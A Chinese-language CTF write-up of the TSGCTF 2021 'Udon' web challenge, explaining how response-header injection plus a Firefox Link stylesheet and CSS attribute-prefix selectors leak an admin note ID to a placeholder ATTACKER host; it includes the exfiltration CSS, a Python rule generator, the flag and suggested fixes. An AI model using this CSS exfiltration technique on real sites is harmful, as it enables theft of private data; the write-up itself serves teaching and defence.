# TSGCTF2021 Udon WP

## 题目简述

应用在数据库中为管理员 UID 创建一篇标题为 `flag` 的私有列表项，flag 本身位于随机 10 字符 ID 对应的 `/notes/<id>` 页面。crawler 访问页面时携带管理员 `uid` Cookie，因此其首页会列出这条链接。

所有响应都允许通过查询参数注入一条任意响应头：

```go
k := c.Query("k")
v := c.Query("v")
if matched, _ := regexp.MatchString("^[a-zA-Z-]+$", k); matched && v != "" {
    c.Header(k, v)
}
```

同时 CSP 为 `style-src 'self'`。目标是只借一条响应头影响 Firefox crawler，逐字符泄露管理员页面上的随机 note ID。

## 解题过程

Firefox 支持把 HTTP `Link` 响应头作为样式表加载。例如：

```http
Link: </notes/ATTACKER_NOTE_ID>; rel="stylesheet"; type="text/css"
```

因此让 worker 访问：

```text
/?k=Link&v=<URL-ENCODED-LINK-VALUE>
```

就能向管理员首页附加一份样式表。跨域 CSS 会被 CSP 拦截，但应用允许任意用户创建 note，且 `/notes/:id` 不检查所有者。把 CSS 文本放进自己的 note 后，该资源与目标同源，可以通过 `style-src 'self'`。

管理员首页中的目标链接形如：

```html
<a href="/notes/rRugPOZEgZ">flag</a>
```

为每个候选字符生成属性前缀选择器，并把命中结果编码成外部图片请求：

```css
a[href^="/notes/a"] { background-image: url(http://ATTACKER/leak?q=a); }
a[href^="/notes/b"] { background-image: url(http://ATTACKER/leak?q=b); }
/* 遍历 A-Z、a-z、0-9 */
```

官方 solver 为避免 CSS 标识符转义问题，把 `/notes/<prefix>` 的每个字符写成十六进制转义：

```python
matcher = ''.join('\\' + hex(ord(ch))[2:] for ch in '/notes/' + prefix)
rule = f'a[href^={matcher}] {{ background-image: url({callback}/leak?q={prefix}); }}'
```

一次只能命中实际前缀对应的规则，攻击者回调据此得到下一个字符。每轮执行：

1. 根据已知前缀和 62 个候选生成 CSS；
2. 把 CSS 创建为同源 note；
3. 通过 `/tell` 让 crawler 访问带 `Link` 头的首页；
4. 从唯一回调更新前缀。

重复 10 轮得到管理员 note ID `rRugPOZEgZ`。直接访问对应页面即可读取：

```text
TSGCTF{uo_uo_uo_uo_uoooooooo_uo_no_gawa_love}
```

## 方法总结

本题展示了“单个可控响应头”也能形成跨页面数据泄露。Firefox 的 `Link` 头把攻击者控制的同源 note 变成样式表，CSS 属性选择器再把不可读的链接前缀转换成可观察的网络请求。CSP 允许 `'self'` 时，同源用户内容必须与可信脚本/样式资源隔离；修复还应删除任意响应头注入，并让 `/notes/:id` 在服务端校验访问者 UID，而不是把随机 URL 当作权限控制。
